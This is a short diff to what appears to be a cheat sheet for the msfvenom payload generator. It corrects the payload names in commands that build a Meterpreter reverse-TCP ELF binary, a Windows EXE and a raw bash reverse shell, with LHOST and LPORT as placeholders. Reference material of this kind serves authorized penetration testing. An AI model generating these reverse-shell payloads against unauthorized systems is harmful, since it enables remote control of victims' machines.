@@ -13,10 +13,10 @@ msfvenom -l formats
 msfvenom -p <payload> --list-options
 
 # Create an ELF binary with a reverse TCP handler
-msfvenom -p linux_x64_meterpreter_reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f elf -o <path_to_binary>
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f elf -o <path_to_binary>
 
 # Create an EXE binary with a reverse TCP handler
-msfvenom -p windows_x64_meterpreter_reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f exe -o <path_to_binary.exe>
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f exe -o <path_to_binary.exe>
 
 # Create a raw bash with a reverse TCP handler
-msfvenom -p cmd_unix_reverse_bash LHOST=<local_ip> LPORT=<local_port> -f raw
+msfvenom -p cmd/unix/reverse_bash LHOST=<local_ip> LPORT=<local_port> -f raw
